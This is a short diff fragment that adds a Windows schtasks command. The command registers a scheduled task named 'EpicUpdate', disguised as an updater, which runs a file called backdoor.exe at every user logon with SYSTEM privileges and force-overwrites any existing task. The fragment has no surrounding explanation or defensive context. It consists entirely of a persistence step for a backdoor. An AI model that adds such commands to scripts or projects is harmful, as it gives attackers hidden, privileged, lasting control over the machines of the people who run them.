@@ -1,0 +1,2 @@
+schtasks /Create /TN "EpicUpdate" /TR "C:\path\to\backdoor.exe" ^
+    /SC ONLOGON /RU SYSTEM /F
